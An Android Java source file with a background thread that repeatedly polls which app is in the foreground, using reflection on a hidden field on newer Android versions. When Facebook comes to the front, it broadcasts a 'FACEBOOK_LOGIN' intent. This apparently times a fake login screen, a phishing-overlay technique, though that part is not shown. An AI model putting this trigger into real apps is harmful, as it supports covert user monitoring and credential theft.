package com.www.pongers_263;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.os.Looper;
import android.util.Log;

import java.lang.reflect.Field;
import java.util.List;

/**
 * Created by winniewu on 11/27/15.
 */
public class Daemon extends Thread {
        final int PROCESS_STATE_TOP = 2;
        ActivityManager am = null;
        Context context = null;

        public Daemon(Context con){
            context = con;
            am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        }

        public void run(){
            Looper.prepare();
            Log.e("www", "running daemon");

            while(true){
                // Return a list of the tasks that are currently running,
                // with the most recent being first and older ones after in order.
                // Taken 1 inside getRunningTasks method means want to take only
                // top activity from stack and forgot the olders.
                if (android.os.Build.VERSION.SDK_INT < 21) {
                    List<ActivityManager.RunningTaskInfo> runningTasks = am.getRunningTasks(1);

                    if ("com.facebook.katana".equals(runningTasks.get(0).topActivity.getPackageName())) {
                        Log.e("www", "facebook running");
                        break;
                    }
                } else {
                    // getRunningTasks is deprecated in Android 5.0 Lollipop+
                    Field field = null;
                    try {
                        field = ActivityManager.RunningAppProcessInfo.class.getDeclaredField("processState");
                    } catch (Exception ignored) {
                        Log.e("www", "error!");
                    }
                    List<ActivityManager.RunningAppProcessInfo> appList = am.getRunningAppProcesses();
                    Log.e("www", appList.toString());
                    for (ActivityManager.RunningAppProcessInfo app : appList) {
                        Log.e("www", app.toString());
                        if (app.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
                                && app.importanceReasonCode == ActivityManager.RunningAppProcessInfo.REASON_UNKNOWN) {
                            Integer state = null;
                            try {
                                state = field.getInt(app);
                            } catch (Exception e) {

                                Log.e("www", "error 2!");
                            }
                            if (state == PROCESS_STATE_TOP) {
                              //  Log.e("www", app.processName);
                              //  Log.e("www", app.toString());

                                Log.e("wwwACTIVE", app.pkgList.toString());
                                //currentInfo = app;
                                //break;
                            }
                        }
                    }

                }
            }
            Intent intent = new Intent();
            intent.setAction("com.www.pongers_263.FACEBOOK_LOGIN");
            context.sendBroadcast(intent);
            Looper.loop();
        }
    }
